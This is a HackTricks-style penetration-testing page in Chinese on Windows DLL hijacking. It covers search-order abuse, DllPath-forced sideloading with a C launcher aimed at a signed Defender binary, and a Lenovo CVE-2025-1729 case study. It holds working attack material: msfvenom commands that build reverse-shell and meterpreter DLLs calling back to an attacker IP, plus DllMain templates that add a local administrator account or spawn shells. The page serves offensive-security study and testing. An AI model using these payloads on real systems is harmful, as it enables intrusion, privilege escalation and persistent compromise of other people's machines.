# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用加载一个恶意 DLL。这个术语涵盖了若干战术，比如 **DLL Spoofing, Injection, and Side-Loading**。该技术主要用于代码执行、实现持久性，较少用于权限提升。尽管这里关注的是提升权限，劫持方法在不同目标间基本一致。

### 常见技术

有几种方法可用于 DLL hijacking，每种方法的有效性取决于应用的 DLL 加载策略：

1. **DLL Replacement**：用恶意 DLL 替换真实的 DLL，可选地使用 DLL Proxying 保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在比合法 DLL 更先被搜索到的路径，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其加载本来不存在但被认为是必需的 DLL。
4. **DLL Redirection**：修改搜索参数，如 %PATH% 或 .exe.manifest / .exe.local 文件，以指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意文件替换合法的 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与复制的应用一同位于用户可控目录中，类似 Binary Proxy Execution 技术。

## 查找缺失的 Dlls

在系统中查找缺失 Dlls 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置**以下**两个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后仅显示**File System Activity**：

![](<../../../images/image (153).png>)

如果你在寻找**一般性的 missing dlls**，可以让它运行**几秒钟**。\
如果你在寻找**特定可执行文件中的 missing dll**，你应该再设置一个类似 "Process Name" "contains" "\<exec name>" 的过滤器，执行它，然后停止捕获事件。

## 利用缺失的 Dlls

为了提升权限，我们最好的机会是能够**写入一个特权进程会尝试加载的 dll**到某些**将被搜索的地方**。因此，我们可以在一个**在原始 dll 所在文件夹之前被搜索的文件夹**中写入该 dll（罕见情况），或者我们可以写入某个**将被搜索但原始 dll 在任何文件夹都不存在**的文件夹中。

### Dll 搜索顺序

在 [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 中可以找到 Dll 是如何被具体加载的。

Windows applications 按照一组预定义的搜索路径查找 DLL，并遵循特定顺序。当一个有害的 DLL 被策略性地放置在这些目录之一，从而确保它在真实 DLL 之前被加载时，就会出现 DLL hijacking 问题。防止这种情况的一种解决方法是确保应用在引用所需 DLL 时使用绝对路径。

下面是 32-bit 系统上的 **DLL search order**：

1. 应用程序加载的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取此目录的路径。（_C:\Windows\System32_）
3. 16-bit 系统目录。没有获取该目录路径的函数，但该目录会被搜索。（_C:\Windows_）
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取此目录的路径。
1. （_C:\Windows_）
5. 当前目录。
6. 列在 PATH 环境变量中的目录。注意，这不包括由 **App Paths** 注册表项指定的每应用程序路径。计算 DLL 搜索路径时不使用 **App Paths** 键。

以上是在启用 **SafeDllSearchMode** 的默认搜索顺序。当其被禁用时，当前目录会提升到第二位。要禁用此功能，创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索会从 LoadLibraryEx 正在加载的可执行模块的目录开始。

最后，注意 **dll 也可以通过指示绝对路径而不是仅名称来加载**。在这种情况下，该 dll **只会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将按照仅通过名称加载时的方式被搜索）。

还有其他方法可以改变搜索顺序，但这里不再详述。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级且确定性地影响新创建进程的 DLL 搜索路径的方法，是在使用 ntdll 的原生 API 创建进程时设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段。通过在此处提供一个攻击者可控的目录，当目标进程通过名称解析导入的 DLL（没有绝对路径且未使用安全加载标志）时，可以被强制从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向你可控文件夹（例如你的 dropper/unpacker 所在目录）的自定义 DllPath。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析期间查阅所提供的 DllPath，从而实现可靠的 sideloading，即使恶意 DLL 不与目标 EXE 同目录。

注意/限制
- 这影响被创建的子进程；它不同于 SetDllDirectory，后者只影响当前进程。
- 目标必须以名称导入或通过 LoadLibrary 加载 DLL（没有绝对路径且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能改变优先级。

最小化 C 示例（ntdll、宽字符串、简化的错误处理）：
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- 将恶意 xmllite.dll（导出所需函数或代理真实的 dll）放到你的 DllPath 目录中。
- 启动一个已签名的二进制文件，该文件已知会按名称查找 xmllite.dll，使用上述技术。加载器通过提供的 DllPath 解析导入并旁加载你的 DLL。

该技术在实战中被观察到用于驱动多阶段旁加载链：初始启动器放下一个辅助 DLL，随后该辅助 DLL 会生成一个 Microsoft-signed、可劫持的二进制文件并带有自定义 DllPath，以强制从一个暂存目录加载攻击者的 DLL。


#### 来自 Windows 文档的 dll 搜索顺序例外情况

Windows 文档中指出了对标准 DLL 搜索顺序的某些例外：

- 当遇到一个 **与内存中已加载的 DLL 同名的 DLL** 时，系统会绕过常规搜索。系统会先检查重定向和 manifest，然后默认使用已在内存中的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果某个 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其版本的 known DLL 以及任何其依赖的 DLL，**放弃搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果某个 **DLL 有依赖项**，这些依赖 DLL 的搜索会像它们仅通过其 **模块名** 指定一样进行，无论初始 DLL 是否通过完整路径被识别。

### 提升权限

**要求**：

- 识别一个以或将以 **不同权限** 运行的进程（用于横向或侧向移动），且该进程**缺少某个 DLL**。
- 确保对将**搜索 DLL**的任意**目录**具有**写权限**。该位置可能是可执行文件的目录或系统路径中的某个目录。

是的，要找到这些先决条件很复杂，因默认情况下很难发现一个具有特权的可执行文件缺少 dll，而且在系统路径文件夹上拥有写权限更是不寻常（默认情况下你不能）。但在配置错误的环境中，这是可能的。\
如果你幸运地满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的**主要目标是 bypass UAC**，你也可能在那里找到针对你所用 Windows 版本的 **PoC**，用于 Dll hijaking（可能只需更改你有写权限的文件夹路径即可）。

注意，你可以通过以下操作**检查你在某个文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并且 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以使用以下方法检查 executable 的 imports 和 dll 的 exports：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要获得关于如何在具有向 **System Path folder** 写入权限的情况下，滥用 **Dll Hijacking** 来提升权限的完整指南，请查看：

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 将检查你是否对 system PATH 中的任何文件夹具有写权限。\
其他用于发现此类漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，要成功利用它最重要的事项之一是 **创建一个 dll，至少导出可执行文件将从中导入的所有函数**。不过请注意，Dll Hijacking 在 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或者从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) 时非常有用。你可以在这个专注于用于执行的 dll hijacking 的研究中找到一个 **如何创建有效 dll** 的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)。\
此外，在**下一节**你可以找到一些**基本 dll 代码**，这些代码可作为**模板**或用于创建**导出非必需函数的 dll**。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本上一个 **Dll proxy** 是一个 Dll，能够 **在加载时执行你的恶意代码**，但也会 **暴露** 并 **工作**，**按预期**，通过 **将所有调用转发到真实库**。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你实际上可以 **指定一个可执行文件并选择要 proxify 的库** 并 **生成一个 proxified dll**，或者 **指定该 Dll** 并 **生成一个 proxified dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86 我没看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

注意：在某些情况下，你编译的 Dll 必须 **导出多个函数**，这些函数会被 victim process 加载；如果这些函数不存在，**binary 将无法加载** 它们，**exploit 将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 案例研究：CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

本案例演示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，编号为 **CVE-2025-1729**。

### 漏洞详情

- **组件**: `TPQMAssistant.exe` 位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **计划任务**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 在已登录用户的上下文中每天 9:30 AM 运行。
- **目录权限**: 可被 `CREATOR OWNER` 写入，允许本地用户放置任意文件。
- **DLL 搜索行为**: 尝试优先从其工作目录加载 `hostfxr.dll`，如果缺失会记录 "NAME NOT FOUND"，表明本地目录搜索优先。

### 利用实现

攻击者可以在相同目录放置恶意的 `hostfxr.dll` 存根，利用缺失的 DLL 在用户上下文下实现代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为标准用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文于上午 9:30 运行。
3. 如果在任务执行时有管理员已登录，恶意 DLL 将在管理员会话中以 medium integrity 运行。
4. 串联标准 UAC bypass 技术，将权限从 medium integrity 提升为 SYSTEM。

### 缓解措施

Lenovo 通过 Microsoft Store 发布了 UWP 版本 **1.12.54.0**，该版本将 TPQMAssistant 安装到 `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\` 下，移除了易受攻击的计划任务，并卸载了传统的 Win32 组件。

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
